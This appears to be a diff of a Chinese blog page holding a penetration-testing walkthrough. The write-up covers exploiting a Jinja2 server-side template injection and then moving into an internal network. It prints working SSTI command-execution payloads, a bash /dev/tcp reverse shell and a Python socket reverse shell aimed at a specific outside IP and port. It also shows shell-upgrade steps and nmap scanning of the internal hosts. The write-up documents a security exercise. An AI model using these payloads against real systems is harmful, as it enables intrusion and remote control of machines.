@@ -6,16 +6,14 @@
     <meta charset="utf-8">
     <meta name="keywords" content="渗透测试-欧拉, 学习记录">
     <meta name="description" content="
-
 过年的一次内网渗透
-
 
 外网打点
 
 尝试模板注入：
 
 确认存在SSTI，网上找个payload试试：SSTI
-&amp;#123;&amp;#123; self._TemplateReference__context.cycler.__init__._">
+&amp;#123;&amp;#123; self._TemplateReference__context.cycler.__init__.__g">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -510,32 +508,25 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>过年的一次内网渗透</p>
 <span id="more"></span>
-
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213642062.png" alt="image-20230122213642062"></p>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213728216.png" alt="image-20230122213728216"></p>
+<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p><img src="/images/渗透测试-欧拉/image-20230122213642062.png" alt="image-20230122213642062"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122213728216.png" alt="image-20230122213728216"></p>
 <p>尝试模板注入：</p>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213746182.png" alt="image-20230122213746182"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122213746182.png" alt="image-20230122213746182"></p>
 <p>确认存在SSTI，网上找个payload试试：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">SSTI</a></p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213851444.png" alt="image-20230122213851444"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122213851444.png" alt="image-20230122213851444"></p>
 <p>root 权限！尝试弹 shell 吧</p>
 <p>有以下两种方式：</p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read() &#125;&#125;&amp;xxx&#x3D;curl baidu.com &#x2F;&#x2F;先用baidu.com测试一下命令是否成功执行以及机器能否出网，之后换成反弹shell的命令就好<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122214203550.png" alt="image-20230122214203550"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122214203550.png" alt="image-20230122214203550"></p>
 <p>可以看到这台机器是可以出网的，接下来我们直接弹 shell，不过在那之前先使用 nps 给我们本地的kali弄一个端口转发</p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read()&#125;&#125;&amp;xxx&#x3D;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.115.222.18&#x2F;12345 0&gt;&amp;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>糟糕地是，我的vps好像用不了上面的方法，直接用python反弹shell</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;121.37.186.22&#x2F;?name&#x3D;&#123;&#123;url_for.__globals__.os.__dict__.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;47.115.222.18\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>反弹之后运行如下命令模拟一个终端设备</p>
 <pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">bash
 nc -lvp 12345
 python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;
@@ -543,11 +534,10 @@ ctrl z
 stty raw -echo
 fg
 export TERM&#x3D;xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>成功拿下第一台靶机</p>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122221102357.png" alt="image-20230122221102357"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122221102357.png" alt="image-20230122221102357"></p>
 <p>看一下这台机器的网络</p>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122221158065.png" alt="image-20230122221158065"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122221158065.png" alt="image-20230122221158065"></p>
 <p>传一个 nmap 上去对内网的其他主机进行扫描，用到的 nmap 来自<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d</a></p>
 <p>这里同样再开一个 nps 代理（端口8001），先将 nmap 下载到本地的 kali，然后直接让这台机器 curl 我们的 vps 就可以了。具体操作如下</p>
 <pre class="line-numbers language-none"><code class="language-none">cd ~
@@ -556,13 +546,10 @@ cd www
 cp ..&#x2F;npc npc
 cp ..&#x2F;nmap nmap
 python -m http.server 8001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h4 id="安装-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps</h4><p>把 vps 服务器的流量转到我们的本地kali上来。</p>
 <p><a target="_blank" rel="noopener" href="https://www.moewah.com/archives/842.html">https://www.moewah.com/archives/842.html</a></p>
 <h3 id="如何获取到一个真正的shell终端"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端</h3><p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
 <pre class="line-numbers language-none"><code class="language-none">bash &#x2F;&#x2F;一定要进bash！
 nc -lvp 9001
 python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
@@ -572,23 +559,17 @@ fg
 export TERM&#x3D;xterm
 stty rows xx columns xxx
 reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h4 id="python-反弹shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;121.37.186.22&#x2F;?name&#x3D;&#123;&#123;url_for.__globals__.os.__dict__.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;47.115.222.18\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h5 id="当前ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip</h5><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181158143.png" alt="image-20230120181158143"></p>
+<h5 id="当前ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip</h5><p><img src="/images/渗透测试-欧拉/image-20230120181158143.png" alt="image-20230120181158143"></p>
 <h5 id="内核信息"><a href="#内核信息" class="headerlink" title="内核信息"></a>内核信息</h5><p>发现是红帽</p>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230120181322429.png" alt="image-20230120181322429"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230120181322429.png" alt="image-20230120181322429"></p>
 <h3 id="nmap扫描内网存活主机"><a href="#nmap扫描内网存活主机" class="headerlink" title="nmap扫描内网存活主机"></a>nmap扫描内网存活主机</h3><pre class="line-numbers language-none"><code class="language-none">mkdir logs
 .&#x2F;nmap -sP -oA logs&#x2F;alive 10.10.10.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122232232261.png" alt="image-20230122232232261"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122232232261.png" alt="image-20230122232232261"></p>
 <p>之后对存活的主机分别进行扫描</p>
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;nmap -v --min-rate&#x3D;10000 -oA logs&#x2F;10.101 10.10.10.101
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122232533975.png" alt="image-20230122232533975"></p>
+<p><img src="/images/渗透测试-欧拉/image-20230122232533975.png" alt="image-20230122232533975"></p>
 <p>80 是 http 服务器，设置一下 kali 的 burp ，让它走socks代理，然后burp再代理浏览器，这样就可以通过浏览器访问 10.10.10.101 了。</p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/332083.html">Linux内网渗透——Linux信息收集与横向移动 - FreeBuf网络安全行业门户</a></p>
 
@@ -895,7 +876,6 @@ reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
                     <div class="summary block-with-text">
                         
                             
-
 专题训练之 SQL 注入
                         
                     </div>
@@ -978,7 +958,7 @@ reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -990,7 +970,7 @@ reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1119,7 +1099,7 @@ reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
